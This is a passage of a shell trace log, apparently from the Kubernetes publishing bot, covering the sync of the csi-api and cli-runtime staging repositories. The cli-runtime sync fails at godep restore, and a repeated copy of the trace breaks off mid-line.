'Looking up which commit in the release-9.0 branch of k8s.io/client-go corresponds to k8s.io/kubernetes commit 4e599c848401470c3c10eb52252c5e3bb5463d3b.'\n>\t+ local k_commit=\n>\t+ local dep_commit=\n>\tLooking up which commit in the release-9.0 branch of k8s.io/client-go corresponds to k8s.io/kubernetes commit 4e599c848401470c3c10eb52252c5e3bb5463d3b.\n>\t+ read k_commit dep_commit\n>\t++ look -b 4e599c848401470c3c10eb52252c5e3bb5463d3b ../kube-commits-client-go-release-9.0\n>\t+ '[' -z 3e32c8333043fc2c058455f4d32986a89d31b05b ']'\n>\t+ pushd ../client-go\n>\tChecking out k8s.io/client-go to 3e32c8333043fc2c058455f4d32986a89d31b05b\n>\t+ echo 'Checking out k8s.io/client-go to 3e32c8333043fc2c058455f4d32986a89d31b05b'\n>\t+ git checkout -q 3e32c8333043fc2c058455f4d32986a89d31b05b\n>\t+ popd\n>\t+ (( i++  ))\n>\t+ (( i<4 ))\n>\t+ local dep=apiextensions-apiserver\n>\t+ local branch=release-1.12\n>\t+ echo 'Looking up which commit in the release-1.12 branch of k8s.io/apiextensions-apiserver corresponds to k8s.io/kubernetes commit 4e599c848401470c3c10eb52252c5e3bb5463d3b.'\n>\tLooking up which commit in the release-1.12 branch of k8s.io/apiextensions-apiserver corresponds to k8s.io/kubernetes commit 4e599c848401470c3c10eb52252c5e3bb5463d3b.\n>\t+ local k_commit=\n>\t+ local dep_commit=\n>\t+ read k_commit dep_commit\n>\t++ look -b 4e599c848401470c3c10eb52252c5e3bb5463d3b ../kube-commits-apiextensions-apiserver-release-1.12\n>\t+ '[' -z ba97476c935ff6cad73c1dfa3463ecca13a19148 ']'\n>\t+ pushd ../apiextensions-apiserver\n>\tChecking out k8s.io/apiextensions-apiserver to ba97476c935ff6cad73c1dfa3463ecca13a19148\n>\t+ echo 'Checking out k8s.io/apiextensions-apiserver to ba97476c935ff6cad73c1dfa3463ecca13a19148'\n>\t+ git checkout -q ba97476c935ff6cad73c1dfa3463ecca13a19148\n>\t+ popd\n>\t+ (( i++  ))\n>\t+ (( i<4 ))\n>\t+ rm -rf ./Godeps\n>\t+ rm -rf ./vendor\n>\tRunning godep save.\n>\t+ echo 'Running godep save.'\n>\t+ godep save ./...\n>\t+ cp Godeps/Godeps.json Godeps/Godeps.json.preserve\n>\t+ git checkout HEAD Godeps/\n>\t+ mv Godeps/Godeps.json.preserve Godeps/Godeps.json\n>\t+ jq 'del(.Deps[].Comment)' Godeps/Godeps.json\n>\t+ indent-godeps\n>\t+ unexpand --first-only --tabs=2\n>\t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>\t+ '[' true = true ']'\n>\t++ git rev-parse --abbrev-ref HEAD\n>\t+ '[' release-1.12 '!=' master ']'\n>\t+ echo 'Removing complete vendor/ on non-master branch because this is a library.'\n>\t+ rm -rf vendor/\n>\tRemoving complete vendor/ on non-master branch because this is a library.\n>\t+ git add Godeps/Godeps.json\n>\t+ git clean -f Godeps\n>\t+ git add vendor/ --ignore-errors\n>\t+ true\n>\t+ git-index-clean\n>\t+ git diff --cached --exit-code\n>\t+ return 0\n>\t+ echo 'Godeps.json hasn'\\''t changed!'\n>\t+ ensure-clean-working-dir\n>\t+ git diff HEAD --exit-code\n>\tGodeps.json hasn't changed!\n>\t++ git rev-parse --abbrev-ref HEAD\n>\t+ '[' release-1.12 '!=' master ']'\n>\t+ '[' -d vendor/ ']'\n>\t+ '[' -n '' ']'\n>\t+ apply-recursive-delete-pattern 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ '[' -z 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml' ']'\n>\t+ local split_recursive_delete_pattern\n>\t+ read -r -a split_recursive_delete_pattern\n>\t+ git rm -q --ignore-unmatch -r BUILD '*/BUILD' BUILD.bazel '*/BUILD.bazel' Gopkg.toml\n>\t+ git add -u\n>\t+ git-index-clean\n>\t+ git diff --cached --exit-code\n>\t+ return 0\n>\t+ git diff --exit-code 833a598b67614ffea5b04ec1fc5bc3e5f6883e56\n>\tRemove redundant godep commits on-top of 833a598b67614ffea5b04ec1fc5bc3e5f6883e56.\n>\t+ echo 'Remove redundant godep commits on-top of 833a598b67614ffea5b04ec1fc5bc3e5f6883e56.'\n>\t+ git reset --soft -q 833a598b67614ffea5b04ec1fc5bc3e5f6883e56\n>\t+ ensure-clean-working-dir\n>\t+ git diff HEAD --exit-code\n>\t++ basename /go-workspace/src/k8s.io/csi-api\n>\t+ local repo=csi-api\n>\t++ git log --oneline --first-parent --merges\n>\t++ head -n 1\n>\t+ '[' -n '833a598 Merge remote-tracking branch '\\''origin/master'\\'' into release-1.12' ']'\n>\t+ echo 'Writing k8s.io/kubernetes commit lookup table to ../kube-commits-csi-api-release-1.12'\n>\tWriting k8s.io/kubernetes commit lookup table to ../kube-commits-csi-api-release-1.12\n>\t++ echo kubernetes\n>\t++ sed 's/^./\\L\\u&/'\n>\t+ /collapsed-kube-commit-mapper --commit-message-tag Kubernetes-commit --source-branch refs/heads/upstream-branch\n>\t++ git rev-parse --abbrev-ref HEAD\n>\t+ LAST_BRANCH=release-1.12\n>\t++ git rev-parse HEAD\n>\t+ LAST_HEAD=833a598b67614ffea5b04ec1fc5bc3e5f6883e56\n>\t+ EXTRA_ARGS=()\n>\t+ PUSH_SCRIPT=../push-tags-csi-api-release-1.12.sh\n>\t+ echo '#!/bin/bash'\n>\t+ chmod +x ../push-tags-csi-api-release-1.12.sh\n>\t+ '[' -z '' ']'\n>\t++ echo kubernetes\n>\t++ echo kubernetes\n>\t++ sed 's/^./\\L\\u&/'\n>\t+ /sync-tags --prefix kubernetes- --commit-message-tag Kubernetes-commit --source-remote upstream --source-branch release-1.12 --push-script ../push-tags-csi-api-release-1.12.sh --dependencies apimachinery:release-1.12,api:release-1.12,client-go:release-9.0,apiextensions-apiserver:release-1.12 --mapping-output-file '../tag-csi-api-{{.Tag}}-mapping' -alsologtostderr ''\n>\tRemoving all local copies of origin and upstream tags.\n>\tFetching tags from remote \"upstream\".\n>\tFetching tags from remote \"origin\".\n>\tComputing mapping from kube commits to the local branch \"release-1.12\" at 833a598b67614ffea5b04ec1fc5bc3e5f6883e56 because \"kubernetes-1.10.0-alpha.0\" seems to be relevant.\n>\tWriting source->dest hash mapping to \"../tag-csi-api-kubernetes-1.12.0-mapping\"\n>\tChecking that Godeps.json points to the actual tags in apimachinery, api, client-go, apiextensions-apiserver.\n>\tChecking out branch tag commit 75c6781b8d78b749ed613b34c6f85c03796d7dbe.\n>\tBumping k8s.io/api in Godeps.json from \"227cb5081d61428b95a76d22b71bba3d4f573023\" to kubernetes-1.12.0: \"0e0cd9538af802d49d76d37848058f2323c34604\".\n>\tBumping k8s.io/apimachinery in Godeps.json from \"227cb5081d61428b95a76d22b71bba3d4f573023\" to kubernetes-1.12.0: \"705814234c8085247e99946887b0fbbd801efa08\".\n>\tBumping k8s.io/client-go in Godeps.json from \"227cb5081d61428b95a76d22b71bba3d4f573023\" to kubernetes-1.12.0: \"fc239b8203672f1a8a16779c2cfd1f99844df219\".\n>\tWarning: dependency k8s.io/apiextensions-apiserver not found in Godeps.json.\n>\tAdding extra commit fixing dependencies to point to kubernetes-1.12.0 tags.\n>\tTagging 7ca9297455a00de4e59b308bd5ae1b5e2165b4b5 as \"kubernetes-1.12.0\".\n>\t++ git rev-parse release-1.12\n>\t+ '[' 833a598b67614ffea5b04ec1fc5bc3e5f6883e56 '!=' 833a598b67614ffea5b04ec1fc5bc3e5f6883e56 ']'\n>\t+ git checkout release-1.12\n>\tPrevious HEAD position was 7ca9297... Fix Godeps.json to point to kubernetes-1.12.0 tags\n>\tSwitched to branch 'release-1.12'\n>\tYour branch is up-to-date with 'origin/release-1.12'.\n>[28 Sep 18 11:54 UTC]: Successfully constructed release-1.12\n>[28 Sep 18 11:54 UTC]: Successfully ensured /go-workspace/src/k8s.io/cli-runtime exists\n>[28 Sep 18 11:54 UTC]: /bin/bash -c \"git tag | xargs git tag -d >/dev/null\"\n>[28 Sep 18 11:54 UTC]: /publish_scripts/construct.sh cli-runtime master master api:master,apimachinery:master,client-go:master  /go-workspace/src/k8s.io/kubernetes/.git staging/src/k8s.io/cli-runtime kubernetes kubernetes k8s.io true \"BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml\"  6b49423a8e99bb08904ac6e110e31c6a4394c024\n>\t+ '[' '!' 14 -eq 14 ']'\n>\t+ REPO=cli-runtime\n>\t+ SRC_BRANCH=master\n>\t+ DST_BRANCH=master\n>\t+ DEPS=api:master,apimachinery:master,client-go:master\n>\t+ REQUIRED=\n>\t+ SOURCE_REMOTE=/go-workspace/src/k8s.io/kubernetes/.git\n>\t+ SUBDIR=staging/src/k8s.io/cli-runtime\n>\t+ SOURCE_REPO_ORG=kubernetes\n>\t+ SOURCE_REPO_NAME=kubernetes\n>\t+ shift 9\n>\t+ BASE_PACKAGE=k8s.io\n>\t+ IS_LIBRARY=true\n>\t+ RECURSIVE_DELETE_PATTERN='BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ SKIP_TAGS=\n>\t+ LAST_PUBLISHED_UPSTREAM_HASH=6b49423a8e99bb08904ac6e110e31c6a4394c024\n>\t+ readonly REPO SRC_BRANCH DST_BRANCH DEPS REQUIRED SOURCE_REMOTE SOURCE_REPO_ORG SUBDIR SOURCE_REPO_NAME BASE_PACKAGE IS_LIBRARY RECURSIVE_DELETE_PATTERN SKIP_TAGS LAST_PUBLISHED_UPSTREAM_HASH\n>\t++ dirname /publish_scripts/construct.sh\n>\t+ SCRIPT_DIR=/publish_scripts\n>\t+ source /publish_scripts/util.sh\n>\t++ set -o errexit\n>\t++ set -o nounset\n>\t++ set -o pipefail\n>\t++ set -o xtrace\n>\tRunning garbage collection.\n>\t+ echo 'Running garbage collection.'\n>\t+ git gc --auto\n>\tFetching from origin.\n>\t+ echo 'Fetching from origin.'\n>\t+ git fetch origin --no-tags --prune\n>\tCleaning up checkout.\n>\t+ echo 'Cleaning up checkout.'\n>\t+ git rebase --abort\n>\tNo rebase in progress?\n>\t+ true\n>\t+ git reset -q --hard\n>\t+ git clean -q -f -f -d\n>\t++ git rev-parse HEAD\n>\t+ git checkout -q 2245523bfbd721a64cbc31864aee8b93c60895c3\n>\t+ git branch -D master\n>\t+ git remote set-head origin -d\n>\t+ git rev-parse origin/master\n>\tSwitching to origin/master.\n>\t+ echo 'Switching to origin/master.'\n>\t+ git branch -f master origin/master\n>\t+ git checkout -q master\n>\tFetching upstream changes.\n>\t+ echo 'Fetching upstream changes.'\n>\t+ git remote\n>\t+ grep -w -q upstream\n>\t+ git remote set-url upstream /go-workspace/src/k8s.io/kubernetes/.git\n>\t+ git fetch -q upstream --no-tags --prune\n>\t++ git rev-parse upstream/master\n>\t+ UPSTREAM_HASH=d204a90dcfdde3b87abd5e0b8be653409b99d190\n>\tUpstream branch upstream/master moved from '6b49423a8e99bb08904ac6e110e31c6a4394c024' to 'd204a90dcfdde3b87abd5e0b8be653409b99d190'. We have to sync.\n>\t+ '[' d204a90dcfdde3b87abd5e0b8be653409b99d190 '!=' 6b49423a8e99bb08904ac6e110e31c6a4394c024 ']'\n>\t+ echo 'Upstream branch upstream/master moved from '\\''6b49423a8e99bb08904ac6e110e31c6a4394c024'\\'' to '\\''d204a90dcfdde3b87abd5e0b8be653409b99d190'\\''. We have to sync.'\n>\t+ sync_repo kubernetes kubernetes staging/src/k8s.io/cli-runtime master master api:master,apimachinery:master,client-go:master '' k8s.io true 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ local source_repo_org=kubernetes\n>\t+ local source_repo_name=kubernetes\n>\t+ local subdirectory=staging/src/k8s.io/cli-runtime\n>\t+ local src_branch=master\n>\t+ local dst_branch=master\n>\t+ local deps=api:master,apimachinery:master,client-go:master\n>\t+ local required_packages=\n>\t+ local base_package=k8s.io\n>\t+ local is_library=true\n>\t+ shift 9\n>\t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ local commit_msg_tag=Kubernetes-commit\n>\t+ readonly subdirectory src_branch dst_branch deps is_library\n>\t+ local new_branch=false\n>\t+ local orphan=false\n>\t+ git rev-parse -q --verify HEAD\n>\tde4bd7443b4279fce102063a767746a2b6be4f66\n>\t++ ls -1\n>\t++ wc -l\n>\t+ '[' 10 = 0 ']'\n>\t++ git rev-parse HEAD\n>\tStarting at existing master commit de4bd7443b4279fce102063a767746a2b6be4f66.\n>\t+ echo 'Starting at existing master commit de4bd7443b4279fce102063a767746a2b6be4f66.'\n>\t+ git branch -D filtered-branch\n>\t+ git branch -f upstream-branch upstream/master\n>\tBranch upstream-branch set up to track remote branch master from upstream.\n>\t++ git rev-parse upstream-branch\n>\tChecked out source commit d204a90dcfdde3b87abd5e0b8be653409b99d190.\n>\t+ echo 'Checked out source commit d204a90dcfdde3b87abd5e0b8be653409b99d190.'\n>\t+ git checkout -q upstream-branch -b filtered-branch\n>\t+ git reset -q --hard upstream-branch\n>\t+ local f_mainline_commits=\n>\t+ '[' false = true ']'\n>\t+ '[' false = true ']'\n>\t++ last-kube-commit Kubernetes-commit master\n>\t++ local commit_msg_tag=Kubernetes-commit\n>\t++ git log --format=%B master\n>\t++ grep '^Kubernetes-commit: '\n>\t++ head -n 1\n>\t++ sed 's/^Kubernetes-commit: //g'\n>\t+ local k_base_commit=0064c6f542b4d02e70b01dbbdbb633d21c094220\n>\t+ '[' -z 0064c6f542b4d02e70b01dbbdbb633d21c094220 ']'\n>\t++ git-find-merge 0064c6f542b4d02e70b01dbbdbb633d21c094220 upstream/master\n>\t++ tail -1\n>\t+++ git rev-list '0064c6f542b4d02e70b01dbbdbb633d21c094220^1..upstream/master' --first-parent\n>\t++ awk 'NR==FNR{a[$1]++;next} a[$1] ' /dev/fd/63 /dev/fd/62\n>\t+++ git rev-list 0064c6f542b4d02e70b01dbbdbb633d21c094220..upstream/master --ancestry-path\n>\t+++ git rev-parse 0064c6f542b4d02e70b01dbbdbb633d21c094220\n>\t+ local k_base_merge=0064c6f542b4d02e70b01dbbdbb633d21c094220\n>\t+ '[' -z 0064c6f542b4d02e70b01dbbdbb633d21c094220 ']'\n>\t+ git branch -f filtered-branch-base 0064c6f542b4d02e70b01dbbdbb633d21c094220\n>\tRewriting upstream branch master to only include commits for staging/src/k8s.io/cli-runtime.\n>\tRunning git filter-branch ...\n>\t+ echo 'Rewriting upstream branch master to only include commits for staging/src/k8s.io/cli-runtime.'\n>\t+ filter-branch Kubernetes-commit staging/src/k8s.io/cli-runtime 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml' filtered-branch filtered-branch-base\n>\t+ local commit_msg_tag=Kubernetes-commit\n>\t+ local subdirectory=staging/src/k8s.io/cli-runtime\n>\t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ echo 'Running git filter-branch ...'\n>\t+ local index_filter=\n>\t+ '[' -n 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml' ']'\n>\t+ patterns=()\n>\t+ local patterns\n>\t+ local p=\n>\t+ index_filter='git rm -q --cached --ignore-unmatch -r'\n>\t+ IFS=' '\n>\t+ read -ra patterns\n>\t+ for p in '\"${patterns[@]}\"'\n>\t+ index_filter+=' '\\''BUILD'\\'''\n>\t+ for p in '\"${patterns[@]}\"'\n>\t+ index_filter+=' '\\''*/BUILD'\\'''\n>\t+ for p in '\"${patterns[@]}\"'\n>\t+ index_filter+=' '\\''BUILD.bazel'\\'''\n>\t+ for p in '\"${patterns[@]}\"'\n>\t+ index_filter+=' '\\''*/BUILD.bazel'\\'''\n>\t+ for p in '\"${patterns[@]}\"'\n>\t+ index_filter+=' '\\''Gopkg.toml'\\'''\n>\t+ git filter-branch -f --index-filter 'git rm -q --cached --ignore-unmatch -r '\\''BUILD'\\'' '\\''*/BUILD'\\'' '\\''BUILD.bazel'\\'' '\\''*/BUILD.bazel'\\'' '\\''Gopkg.toml'\\''' --msg-filter 'awk 1 && echo && echo \"Kubernetes-commit: ${GIT_COMMIT}\"' --subdirectory-filter staging/src/k8s.io/cli-runtime -- filtered-branch filtered-branch-base\n>\t++ git rev-parse filtered-branch-base\n>\t+ local f_base_commit=ad014a7e190aad85516c192171618f090bc42751\n>\t++ git log --first-parent --format=%H --reverse ad014a7e190aad85516c192171618f090bc42751..HEAD\n>\t+ f_mainline_commits=\n>\t+ echo 'Checking out branch master.'\n>\t+ git checkout -q master\n>\tChecking out branch master.\n>\t+ '[' -f kubernetes-sha ']'\n>\t+ apply-recursive-delete-pattern 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ '[' -z 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml' ']'\n>\t+ local split_recursive_delete_pattern\n>\t+ read -r -a split_recursive_delete_pattern\n>\t+ git rm -q --ignore-unmatch -r BUILD '*/BUILD' BUILD.bazel '*/BUILD.bazel' Gopkg.toml\n>\t+ git add -u\n>\t+ git-index-clean\n>\t+ git diff --cached --exit-code\n>\t+ return 0\n>\t++ git rev-parse HEAD\n>\t+ local dst_old_head=de4bd7443b4279fce102063a767746a2b6be4f66\n>\t+ local k_pending_merge_commit=\n>\t+ local dst_needs_godeps_update=false\n>\t++ git rev-parse HEAD\n>\t+ local dst_merge_point_commit=de4bd7443b4279fce102063a767746a2b6be4f66\n>\t+ for f_mainline_commit in '${f_mainline_commits}' FLUSH_PENDING_MERGE_COMMIT\n>\t+ local k_mainline_commit=\n>\t+ local k_new_pending_merge_commit=\n>\t+ '[' FLUSH_PENDING_MERGE_COMMIT = FLUSH_PENDING_MERGE_COMMIT ']'\n>\t+ k_new_pending_merge_commit=FLUSH_PENDING_MERGE_COMMIT\n>\t+ '[' -n '' ']'\n>\t+ k_pending_merge_commit=FLUSH_PENDING_MERGE_COMMIT\n>\t+ '[' FLUSH_PENDING_MERGE_COMMIT = FLUSH_PENDING_MERGE_COMMIT ']'\n>\t+ break\n>\tFixing up godeps after a complete sync\n>\t+ echo 'Fixing up godeps after a complete sync'\n>\t++ git rev-parse HEAD\n>\t+ '[' de4bd7443b4279fce102063a767746a2b6be4f66 '!=' de4bd7443b4279fce102063a767746a2b6be4f66 ']'\n>\t+ '[' false = true ']'\n>\t+ fix-godeps api:master,apimachinery:master,client-go:master '' k8s.io true true false Kubernetes-commit 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ '[' '' = true ']'\n>\t+ local deps=api:master,apimachinery:master,client-go:master\n>\t+ local required_packages=\n>\t+ local base_package=k8s.io\n>\t+ local is_library=true\n>\t+ local needs_godeps_update=true\n>\t+ local squash=false\n>\t+ local commit_msg_tag=Kubernetes-commit\n>\t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t++ git rev-parse HEAD\n>\t+ local dst_old_commit=de4bd7443b4279fce102063a767746a2b6be4f66\n>\t+ '[' true = true ']'\n>\t+ update_full_godeps api:master,apimachinery:master,client-go:master k8s.io true Kubernetes-commit\n>\t+ local deps=api:master,apimachinery:master,client-go:master\n>\t+ local base_package=k8s.io\n>\t+ local is_library=true\n>\t+ local commit_msg_tag=Kubernetes-commit\n>\t+ ensure-clean-working-dir\n>\t+ git diff HEAD --exit-code\n>\t+ for d in '$../*'\n>\t+ '[' '!' -d '$../*' ']'\n>\t+ continue\n>\t+ '[' '!' -f Godeps/Godeps.json ']'\n>\t+ echo 'Removing k8s.io/* dependencies from Godeps.json'\n>\t+ local dep=\n>\t+ local branch=\n>\tRemoving k8s.io/* dependencies from Godeps.json\n>\t+ local depbranch=\n>\t++ basename /go-workspace/src/k8s.io/cli-runtime\n>\t+ for depbranch in '${deps//,/ }' '$(basename \"${PWD}\")'\n>\t+ IFS=:\n>\t+ read dep branch\n>\t+ jq '.Deps |= map(select(.ImportPath | (startswith(\"k8s.io/api/\") or . == \"k8s.io/api\") | not))' Godeps/Godeps.json\n>\t+ indent-godeps\n>\t+ unexpand --first-only --tabs=2\n>\t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>\t+ for depbranch in '${deps//,/ }' '$(basename \"${PWD}\")'\n>\t+ IFS=:\n>\t+ read dep branch\n>\t+ jq '.Deps |= map(select(.ImportPath | (startswith(\"k8s.io/apimachinery/\") or . == \"k8s.io/apimachinery\") | not))' Godeps/Godeps.json\n>\t+ indent-godeps\n>\t+ unexpand --first-only --tabs=2\n>\t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>\t+ for depbranch in '${deps//,/ }' '$(basename \"${PWD}\")'\n>\t+ IFS=:\n>\t+ read dep branch\n>\t+ jq '.Deps |= map(select(.ImportPath | (startswith(\"k8s.io/client-go/\") or . == \"k8s.io/client-go\") | not))' Godeps/Godeps.json\n>\t+ indent-godeps\n>\t+ unexpand --first-only --tabs=2\n>\t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>\t+ for depbranch in '${deps//,/ }' '$(basename \"${PWD}\")'\n>\t+ IFS=:\n>\t+ read dep branch\n>\t+ jq '.Deps |= map(select(.ImportPath | (startswith(\"k8s.io/cli-runtime/\") or . == \"k8s.io/cli-runtime\") | not))' Godeps/Godeps.json\n>\t+ indent-godeps\n>\t+ unexpand --first-only --tabs=2\n>\t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>\t+ echo 'Running godep restore.'\n>\t+ godep restore\n>\tRunning godep restore.\n>\tgodep: error downloading dep (golang.org/x/sys/unix): unrecognized import path \"golang.org/x/sys/unix\"\n>\tgodep: Error downloading some deps. Aborting restore and check.\n>[28 Sep 18 11:55 UTC]: exit status 1\n>    \t+ '[' '!' 14 -eq 14 ']'\n>    \t+ REPO=cli-runtime\n>    \t+ SRC_BRANCH=master\n>    \t+ DST_BRANCH=master\n>    \t+ DEPS=api:master,apimachinery:master,client-go:master\n>    \t+ REQUIRED=\n>    \t+ SOURCE_REMOTE=/go-workspace/src/k8s.io/kubernetes/.git\n>    \t+ SUBDIR=staging/src/k8s.io/cli-runtime\n>    \t+ SOURCE_REPO_ORG=kubernetes\n>    \t+ SOURCE_REPO_NAME=kubernetes\n>    \t+ shift 9\n>    \t+ BASE_PACKAGE=k8s.io\n>    \t+ IS_LIBRARY=true\n>    \t+ RECURSIVE_DELETE_PATTERN='BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>    \t+ SKIP_TAGS=\n>    \t+ LAST_PUBLISHED_UPSTREAM_HASH=6b49423a8e99bb08904ac6e110e31c6a4394c024\n>    \t+ readonly REPO SRC_BRANCH DST_BRANCH DEPS REQUIRED SOURCE_REMOTE SOURCE_REPO_ORG SUBDIR SOURCE_REPO_NAME BASE_PACKAGE IS_LIBRARY RECURSIVE_DELETE_PATTERN SKIP_TAGS LAST_PUBLISHED_UPSTREAM_HASH\n>    \t++ dirname /publish_scripts/construct.sh\n>    \t+ SCRIPT_DIR=/publish_scripts\n>    \t+ source /publish_scripts/util.sh\n>    \t++ set -o errexit\n>    \t++ set -o nounset\n>    \t++ set -o pipefail\n>    \t++ set -o xtrace\n>    \t+ echo 'Running garbage collection.'\n>    \t+ git gc --auto\n>    \t+ echo 'Fetching from origin.'\n>    \t+ git fetch origin --no-tags --prune\n>    \t+ echo 'Cleaning up checkout.'\n>    \t+ git rebase --abort\n>    \tNo rebase in progress?\n>    \t+ true\n>    \t+ git reset -q --hard\n>    \t+ git clean -q -f -f -d\n>    \t++ git rev-parse HEAD\n>    \t+ git checkout -q 2245523bfbd721a64cbc31864aee8b93c60895c3\n>    \t+ git branch -D master\n>    \t+ git remote set-head origin -d\n>    \t+ git rev-parse origin/master\n>    \t+ echo 'Switching to origin/master.'\n>    \t+ git branch -f master origin/master\n>    \t+ git checkout -q master\n>    \t+ echo 'Fetching upstream changes.'\n>    \t+ git remote\n>    \t+ grep -w -q upstream\n>    \t+ git remote set-url upstream /go-workspace/src/k8s.io/kubernetes/.git\n>    \t+ git fetch -q upstream --no-tags --prune\n>    \t++ git rev-parse upstream/master\n>    \t+ UPSTREAM_HASH=d204a90dcfdde3b87abd5e0b8be653409b99d190\n>    \t+ '[' d204a90dcfdde3b87abd5e0b8be653409b99d190 '!=' 6b49423a8e99bb08904ac6e110e31c6a4394c024 ']'\n>    \t+ echo 'Upstream branch upstream/master moved from '\\''6b49423a8e99bb08904ac6e110e31c6a4394c024'\\'' to '\\''d204a90dcfdde3b87abd5e0b8be653409b99d190'\\''. We have to sync.'\n>    \t+ sync_repo kubernetes kubernetes staging/src/k8s.io/cli-runtime master master api:master,apimachinery:master,client-go:master '' k8s.io true 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>    \t+ local source_repo_org=kubernetes\n>    \t+ local source_repo_name=kubernetes\n>    \t+ local subdirectory=staging/src/k8s.io/cli-runtime\n>    \t+ local src_branch=master\n>    \t+ local dst_branch=master\n>    \t+ local deps=api:master,apimachinery:master,client-go:master\n>    \t+ local required_packages=\n>    \t+ local base_package=k8s.io\n>    \t+ local is_library=true\n>    \t+ shift 9\n>    \t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>    \t+ local commit_msg_tag=Kubernetes-commit\n>    \t+ readonly subdirectory src_branch dst_branch deps is_library\n>    \t+ local new_branch=false\n>    \t+ local orphan=false\n>    \t+ git rev-parse -q --verify HEAD\n>    \t++ ls -1\n>    \t++ wc -l\n>    \t+ '[' 10 = 0 ']'\n>    \t++ git rev-parse HEAD\n>    \t+ echo 'Starting at existing master commit de4bd7443b4279fce102063a767746a2b6be4f66.'\n>    \t+ git branch -D filtered-branch\n>    \t+ git branch -f upstream-branch upstream/master\n>    \t++ git rev-parse upstream-branch\n>    \t+ echo 'Checked out source commit d204a90dcfdde3b87abd5e0b8be653409b99d190.'\n>    \t+ git checkout -q upstream-branch -b filtered-branch\n>    \t+ git reset -q --hard upstream-branch\n>    \t+ local f_mainline_commits=\n>    \t+ '[' false = true ']'\n>    \t+ '[' false = true ']'\n>    \t++ last-kube-commit Kubernetes-commit master\n>    \t++ local commit_msg_tag=Kubernetes-commit\n>    \t++ git log --format=%B master\n>    \t++ grep '^Kubernetes-commit: '\n>    \t++ head -n 1\n>    \t++ sed 's/^Kubernetes-commit: //g'\n>    \t+ local k_base_commit=0064c6f542b4d02e70b01dbbdbb633d21c094220\n>    \t+ '[' -z 0064c6f542b4d02e70b01dbbdbb633d21c094220 ']'\n>    \t++ git-find-merge 0064c6f542b4d02e70b01dbbdbb633d21c094220 upstream/master\n>    \t++ tail -1\n>    \t+++ git rev-list '0064c6f542b4d02e70b01dbbdbb633d21c094220^1..upstream/master' --first-parent\n>    \t++ awk 'NR==FNR{a[$1]++;next} a[$1] ' /dev/fd/63 /dev/fd/62\n>    \t+++ git rev-list 0064c6f542b4d02e70b01dbbdbb633d21c094220..upstream/master --ancestry-path\n>    \t+++ git rev-parse 0064c6f542b4d02e70b01dbbdbb633d21c094220\n>    \t+ local k_base_merge=0064c6f542b4d02e70b01dbbdbb633d21c094220\n>    \t+ '[' -z 0064c6f542b4d02e70b01dbbdbb633d21c094220 ']'\n>    \t+ git branch -f filtered-branch-base 0064c6f542b4d02e70b01dbbdbb633d21c094220\n>    \t+ echo 'Rewriting upstream branch master to only include commits for staging/src/k8s.io/cli-runtime.'\n>    \t+ filter-branch Kubernetes-commit staging/src/k8s.io/cli-runtime 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml' filtered-branch filtered-branch-base\n>    \t+ local commit_msg_tag=Kubernetes-commit\n>    \t+ local subdirectory=staging/src/k8s.io/cli-runtime\n>    \t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>    \t+ echo 'Running git filter-branch ...'\n>    \t+ local index_filter=\n>    \t+ '[' -n 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml' ']'\n>    \t+ patterns=()\n>    \t+ local patterns\n>    \t+ local p=\n>    \t+ index_filter='git rm -q --cached --ignore-unmatch -r'\n>    \t+ IFS=' '\n>    \t+ read -ra patterns\n>    \t+ for p in '\"${patterns[@]}\"'\n>    \t+ index_filter+=' '\\''BUILD'\\'''\n>    \t+ for p in '\"${patterns[@]}\"'\n>    \t+ index_filter+=' '\\''*/BUILD'\\'''\n>    \t+ for p in '\"${patterns[@]}\"'\n>    \t+ index_filter+=' '\\''BUILD.bazel'\\'''\n>    \t+ for p in '\"${patterns[@]}\"'\n>    \t+ index_filter+=' '\\''*/BUILD.bazel'\\'''\n>    \t+ for p in '\"${patterns[@]}\"'\n>    \t+ index_filter+=' '\\''Gopkg.toml'\\'''\n>    \t+ git filter-branch -f --index-filter 'git rm -q --cached --ignore-unmatch -r '\\''BUILD'\\'' '\\''*/BUILD'\\'' '\\''BUILD.bazel'\\'' '\\''*/BUILD.bazel'\\'' '\\''Gopkg.toml'\\''' --msg-filter 'awk 1 && echo && echo \"Kubernetes-commit: ${GIT_COMMIT}\"' --subdirectory-filter staging/src/k8s.io/cli-runtime -- filtered-branch filtered-branch-base\n>    \t++ git rev-parse filtered-branch-base\n>    \t+ local f_base_commit=ad014a7e190aad85516c192171618f090bc42751\n>    \t++ git log --first-parent --format=%H --reverse ad014a7e190aad85516c192171618f090bc42751..HEAD\n>    \t+ f_mainline_commits=\n>    \t+ echo 'Checking out branch 